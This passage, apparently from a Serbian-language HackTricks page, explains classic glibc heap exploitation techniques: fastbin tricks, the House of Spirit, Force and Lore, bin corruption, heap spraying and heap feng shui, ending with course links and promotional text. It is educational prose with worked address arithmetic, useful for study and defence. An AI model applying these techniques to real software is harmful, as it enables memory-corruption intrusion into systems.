TakoÄ‘e, mora se ispuniti uslov da susedni deo osloboÄ‘enog dela bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog dela 8, u ovom laÅ¾nom delu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom delu, treba staviti na poÄetak jmp koji Ä‡e pasti na nops).

TakoÄ‘e, isti laÅ¾ni deo mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula iz \_DTOR\_END\_ i malog broja adresa u GOT-u, nijedna adresa iz ovih sekcija nije pogodna za prebrisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

JoÅ¡ jedan naÄin napada je preusmeravanje **av** ka steku.

Ako promenimo veliÄinu da bude 16 umesto 8, tada: fastbin\_index() Ä‡e nam vratiti fastbins\[0] i moÅ¾emo koristiti ovo da prepiÅ¡emo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili Äudnih vrednosti na steku, zapravo moramo biti u ovom sluÄaju: 4 bajta nula + EBP + RET

Potrebna su nam 4 bajta nula kako bi **av** bio na ovoj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** Ä‡e biti EBP i biÄ‡e vrednost koja Ä‡e nam omoguÄ‡iti da preskoÄimo ograniÄenja.

U **av->fastbins\[0]** Ä‡e se prebrisati sa adresom **p** i biÄ‡e RET, tako da Ä‡e se preskoÄiti do shellcode.

TakoÄ‘e, u **av->system\_mem** (1484 bajta iznad pozicije na steku) Ä‡e biti dovoljno smeÄ‡a koje Ä‡e nam omoguÄ‡iti da preskoÄimo proveru koja se vrÅ¡i.

TakoÄ‘e, mora se ispuniti uslov da susedni deo osloboÄ‘enog dela bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog dela 16, u ovom laÅ¾nom delu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom delu, treba staviti na poÄetak jmp koji Ä‡e pasti na nops koji idu nakon polja size novog laÅ¾nog dela).

**The House of Spirit**

U ovom sluÄaju traÅ¾imo da imamo pokazivaÄ na malloc koji moÅ¾e biti promenjen od strane napadaÄa (na primer, da pokazivaÄ bude na steku ispod moguÄ‡eg prelivanja promenljive).

Na taj naÄin, mogli bismo da navedemo da ovaj pokazivaÄ pokazuje gde god Å¾elimo. MeÄ‘utim, ne svako mesto je validno, veliÄina laÅ¾nog dela mora biti manja od av->max\_fast i taÄnije jednaka veliÄini koja Ä‡e biti traÅ¾ena u buduÄ‡em pozivu malloc()+8. Zbog toga, ako znamo da se nakon ovog ranjivog pokazivaÄa poziva malloc(40), veliÄina laÅ¾nog dela mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mogli bismo uneti 48 i usmeriti promenljivi pokazivaÄ malloc na sledeÄ‡ih 4 bajta (koji bi mogli pripadati EBP sa sreÄ‡om, tako da 48 ostaje iza, kao da je veliÄina zaglavlja). TakoÄ‘e, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluÄaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U sluÄaju da se ovo ispuni, kada se pozove sledeÄ‡i malloc koji smo rekli da je malloc(40), kao adresi Ä‡e biti dodeljena adresa EBP. U sluÄaju da napadaÄ takoÄ‘e moÅ¾e kontrolisati Å¡ta se piÅ¡e u ovom mallocu, moÅ¾e prebrisati kako EBP tako i EIP sa adresom koju Å¾eli.

Mislim da je to zato Å¡to kada se oslobodi free() ÄuvaÄ‡e se da u adresi koja pokazuje na EBP steka postoji deo veliÄine savrÅ¡ene za novi malloc() koji se Å¾eli rezervisati, pa Ä‡e mu biti dodeljena ta adresa.

**The House of Force**

Potrebno je:

* PrekoraÄenje u delu koje omoguÄ‡ava prebrisivanje wilderness
* Poziv malloc() sa veliÄinom definisanom od strane korisnika
* Poziv malloc() Äiji podaci mogu biti definisani od strane korisnika

Prvo Å¡to se radi je prebrisivanje veliÄine dela wilderness sa veoma velikom vrednoÅ¡Ä‡u (0xffffffff), tako da Ä‡e svaki zahtev za memorijom dovoljno velik biti obraÄ‘en u \_int\_malloc() bez potrebe za proÅ¡irivanjem hipa.

Drugo je promena av->top kako bi pokazivao na deo memorije pod kontrolom napadaÄa, kao Å¡to je stek. U av->top Ä‡e se staviti \&EIP - 8.

Mora se prebrisati av->top kako bi pokazivao na deo memorije pod kontrolom napadaÄa:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog dela wilderness (trenutni av->top) i remainder je taÄno suma te adrese plus koliÄina bajtova traÅ¾ena od malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadrÅ¾i 0x080c2788, tada je koliÄina koju moramo rezervisati u kontrolisanom mallocu kako bi av->top pokazivao na $EIP-8 za sledeÄ‡i malloc() Ä‡e biti:

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naÄin Ä‡e se saÄuvati promenjena vrednost u av->top i sledeÄ‡i malloc Ä‡e pokazivati na EIP i moÄ‡i Ä‡e ga prebrisati.

VaÅ¾no je znati da veliÄina novog dela wilderness bude veÄ‡a od zahteva poslednjeg malloc(). Drugim reÄima, ako wilderness pokazuje na \&EIP-8, veliÄina Ä‡e biti taÄno u polju EBP steka.

**The House of Lore**

**Korupcija SmallBin**

OsloboÄ‘eni delovi se ubacuju u bin u zavisnosti od njihove veliÄine. Ali pre nego Å¡to se ubace, Äuvaju se u unsorted bins. Deo koji je osloboÄ‘en ne stavlja se odmah u svoj bin veÄ‡ ostaje u unsorted bins. Zatim, ako se rezerviÅ¡e novi deo i prethodno osloboÄ‘eni moÅ¾e posluÅ¾iti, vraÄ‡a se, ali ako se rezerviÅ¡e veÄ‡i deo, osloboÄ‘eni deo u unsorted bins se stavlja u odgovarajuÄ‡i bin.

Da bi se doÅ¡lo do ranjivog koda, zahtev za memorijom mora biti veÄ‡i od av->max\_fast (obiÄno 72) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuÄ‡e veliÄine zahtevanog dela, on se vraÄ‡a nakon Å¡to se odveÅ¾e:

bck = victim->bk; Pokazuje na prethodni deo, to je jedina informacija koju moÅ¾emo promeniti.

bin->bk = bck; Predzadnji deo postaje poslednji, u sluÄaju da bck pokazuje na stek, sledeÄ‡em rezervisanom delu biÄ‡e dodeljena ova adresa

bck->fd = bin; Zatvara se lista tako Å¡to ovaj pokazuje na bin

Potrebno je:
RezerviÅ¡ite dva malloc-a, tako da se prvi moÅ¾e preplaviti nakon Å¡to je drugi osloboÄ‘en i ubaÄen u svoj bin (tj. rezervisan je malloc veÄ‡i od drugog dela pre prelivanja)

Malloc rezervisan za adresu koju odabere napadaÄ mora biti pod kontrolom napadaÄa.

Cilj je sledeÄ‡i, ako moÅ¾emo preplaviti heap koji ima osloboÄ‘en deo ispod i u svom binu, moÅ¾emo promeniti njegov pokazivaÄ bk. Ako promenimo pokazivaÄ bk i taj deo postane prvi na listi binova i rezervisan je, bin Ä‡e biti prevaren i reÄ‡i Ä‡e mu se da je sledeÄ‡i deo liste (sledeÄ‡i koji se nudi) na laÅ¾noj adresi koju smo postavili (na stack ili GOT na primer). Dakle, ako se rezerviÅ¡e joÅ¡ jedan deo i napadaÄ ima dozvole na njemu, dobiÄ‡e deo na Å¾eljenoj poziciji i moÄ‡i Ä‡e da piÅ¡e u njega.

Nakon Å¡to se modifikovani deo oslobodi, potrebno je rezervisati deo veÄ‡i od osloboÄ‘enog, tako da modifikovani deo izaÄ‘e iz unsorted binova i ubaci se u svoj bin.

Kada je u svom binu, vreme je da se promeni pokazivaÄ bk preko prelivanja kako bi pokazivao na adresu koju Å¾elimo da prepisujemo.

Dakle, bin mora da saÄeka da se pozove dovoljno puta malloc() kako bi se ponovo koristio modifikovani bin i prevario bin tako Å¡to Ä‡e mu se reÄ‡i da je sledeÄ‡i deo na laÅ¾noj adresi. Zatim Ä‡e se dati deo koji nas zanima.

Da bi se ranjivost izvrÅ¡ila Å¡to je pre moguÄ‡e, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji Ä‡e se modifikovati, osloboÄ‘enje ovog dela, rezervacija dela veÄ‡eg od onog koji Ä‡e se modifikovati, modifikacija dela (ranjivost), rezervacija dela iste veliÄine kao ranjeno i rezervacija drugog dela iste veliÄine koji Ä‡e pokazivati na odabranu adresu.

Za zaÅ¡titu od ovog napada koristi se tipiÄna provera da deo "nije" laÅ¾an: proverava se da li bck->fd pokazuje na Å¾rtvu. Drugim reÄima, u naÅ¡em sluÄaju, ako pokazivaÄ fd* laÅ¾nog dela pokazuje na Å¾rtvu na stacku. Da bi prevaziÅ¡ao ovu zaÅ¡titu, napadaÄ bi trebalo na neki naÄin (verovatno preko stacka) da bude u moguÄ‡nosti da piÅ¡e na odgovarajuÄ‡u adresu adresu Å¾rtve. Tako Ä‡e izgledati kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre, plus neki dodatni, osim toga, rezervisani delovi moraju biti veÄ‡i od 512.

Napad je kao i prethodni, tj. treba promeniti pokazivaÄ bk i potrebni su svi ti pozivi malloc(), ali takoÄ‘e treba promeniti veliÄinu modifikovanog dela tako da taj size - nb bude < MINSIZE.

Na primer, treba postaviti size na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne moÅ¾e biti negativno jer se uporeÄ‘uje sa unsigned)

TakoÄ‘e je uveden zakrpa da bi se to uÄinilo joÅ¡ sloÅ¾enijim.

**RasprÅ¡ivanje Heap-a**

Osnovna ideja je rezervisati Å¡to je viÅ¡e moguÄ‡e memorije za heap-ove i popuniti ih jastukom od nopsa zavrÅ¡enim shellcode-om. TakoÄ‘e se koristi 0x0c kao jastuk. PokuÅ¡aÄ‡e se skoÄiti na adresu 0x0c0c0c0c, pa ako se prepisuje neka adresa na koju Ä‡e se pozvati ovaj jastuk, skoÄiÄ‡e tamo. Osnovna taktika je rezervisati Å¡to je viÅ¡e moguÄ‡e kako bi se videlo da li se prepisuje neki pokazivaÄ i skoÄiti na 0x0c0c0c0c u nadi da Ä‡e tamo biti nops.

**Feng Shui Heap-a**

Sastoji se u cementiranju memorije putem rezervacija i osloboÄ‘enja kako bi se ostavili rezervisani delovi izmeÄ‘u slobodnih delova. Bafer za prelivanje Ä‡e se nalaziti u jednom od tih delova.

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
